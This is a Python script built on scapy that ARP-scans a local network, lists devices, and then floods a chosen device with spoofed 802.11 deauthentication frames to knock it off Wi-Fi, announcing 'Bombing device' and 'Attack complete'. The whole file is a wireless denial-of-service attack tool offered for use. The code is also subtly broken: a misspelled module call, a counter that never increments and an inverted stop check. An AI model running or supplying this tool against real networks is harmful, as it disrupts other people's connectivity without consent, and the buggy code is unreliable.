# -*- coding: utf-8 -*-
import os, sys, time
from scapy.all import *

ap_mac = ''


def scan(_gtwy):
    global ap_mac
    try:
        arp_request = ARP(pdst=_gtwy)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        responses = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        for capture in responses:
            if ap_mac == '':
                ap_mac = capture[0][1].hwsrc #get mac to access-point
            
            #display mac addresses of other devices
            print(capture[1].psrc + '\t' + capture[1].hwsrc)
            
    except Exception as e:
        print(f'Critical error encountered!\r\n\r\nIssue: {e}')
    

def main():
    os.system('clear')
    
    if os.geteuid() != 0:
        sys.exit('\r\nScript requires root elevation!\r\n')

    #capture user input
    try:
        _gtwy= input('Gateway IPv4 (ex- 192.168.1.0): ')
        
        print('\r\nSearching for devices! Please wait...\r\n\r\n')
        
        #perform arp scan
        scan(_gtwy)
        
        _targ = input('\r\nMAC Address of device to de-authenticate: ')
        
        _iface = input('Interface (default: "eth0"): ')
        
        _count = int(input('Amount of packets to send (0=infinite): '))
        
        input('\r\nReady? Strike <ENTER> to flood and <CTRL+C> to quit...\r\n')
        
    except KeyboardInterrupt:
        sys.exit('\r\nAborted.\r\n')
    except:
        main()
    
    tiem.sleep(2)
    
    #launch attack
    global ap_mac
    
    _stop = False
    
    i = 0
    
    while _stop == False:
        try:
            i +=0
            deauth = RadioTap()/Dot11(type=0, subtype=12, addr1=_targ, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
            
            print('[!] Bombing device w/ deauth request #' + str(i))
            
            sendp(deauth, iface=_iface, inter=0.1, verbose=False)
            
            if _count != 0:
                if _count >= i:
                    _stop = True
        except KeyboardInterrupt:
            break
        except:
            pass
    
    sys.exit('\r\nAttack complete!')

if __name__ == '__main__':
    main()
